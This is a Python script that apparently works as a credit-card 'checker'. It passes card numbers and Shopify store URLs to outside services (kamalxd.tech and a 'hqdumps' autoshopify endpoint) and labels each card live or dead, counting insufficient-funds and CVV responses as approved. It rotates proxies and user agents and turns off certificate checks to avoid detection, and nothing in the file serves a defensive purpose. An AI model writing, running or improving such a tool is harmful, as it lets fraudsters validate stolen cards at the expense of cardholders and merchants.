import requests
import traceback
import urllib3
import random

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# List of API endpoints (primary first)
SHOPIFY_APIS = [
    "https://kamalxd.tech/sh/index.php",
    "https://hqdumps.com/autoshopify/index.php"
]

def format_proxy(proxy):
    if not proxy:
        return None
    try:
        parts = proxy.split(':')
        if len(parts) == 4:
            host, port, user, password = parts
            proxy_url = f"http://{user}:{password}@{host}:{port}"
            return {'http': proxy_url, 'https': proxy_url}
        elif len(parts) == 2:
            host, port = parts
            proxy_url = f"http://{host}:{port}"
            return {'http': proxy_url, 'https': proxy_url}
        else:
            return None
    except Exception:
        return None

def check_site_shopify_direct(site_url, cc, proxy=None):
    params = {'cc': cc, 'url': site_url}
    if proxy:
        params['proxy'] = proxy

    user_agents = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36'
    ]
    headers = {'User-Agent': random.choice(user_agents)}
    proxies = format_proxy(proxy) if proxy else None

    for api_url in SHOPIFY_APIS:
        try:
            response = requests.get(
                api_url,
                params=params,
                headers=headers,
                proxies=proxies,
                timeout=30,
                verify=False
            )
            data = response.json()
            if isinstance(data, dict) and 'Response' in data:
                resp_text = data.get('Response', 'Unknown')
                price = data.get('Price', '0.00')
                gateway = data.get('Gate', 'Unknown')
                site = data.get('Site', site_url)

                status = 'ERROR'
                resp_lower = resp_text.lower()
                if 'approved' in resp_lower or 'live' in resp_lower or 'success' in resp_lower:
                    status = 'APPROVED'
                elif 'declined' in resp_lower:
                    status = 'DECLINED'
                elif 'insufficient' in resp_lower:
                    status = 'APPROVED'
                elif 'cvv' in resp_lower:
                    status = 'APPROVED'
                elif 'do not honor' in resp_lower:
                    status = 'DECLINED'

                return {
                    'Response': resp_text,
                    'status': status,
                    'gateway': gateway,
                    'price': price,
                    'site': site
                }
            # Not a valid response – try next API
        except Exception as e:
            print(f"API {api_url} failed: {e}")
            continue

    # All APIs failed
    return {
        'Response': 'All APIs failed',
        'status': 'ERROR',
        'gateway': 'Unknown',
        'price': '0.00',
        'site': site_url
    }

def process_response_shopify(api_response, site_price='0'):
    try:
        if not api_response or not isinstance(api_response, dict):
            return "System Error", "ERROR", "Unknown"

        status = api_response.get('status', 'ERROR').upper()
        message = api_response.get('Response', 'Unknown Result')
        gateway = api_response.get('gateway', 'Shopify Payments')

        if status == 'APPROVED':
            if 'otp' in message.lower() or 'authentication' in message.lower():
                status = 'APPROVED_OTP'
        elif status == 'DECLINED':
            pass
        else:
            status = 'ERROR'

        return message, status, gateway

    except Exception as e:
        return f"Parse Error: {e}", "ERROR", "Unknown"
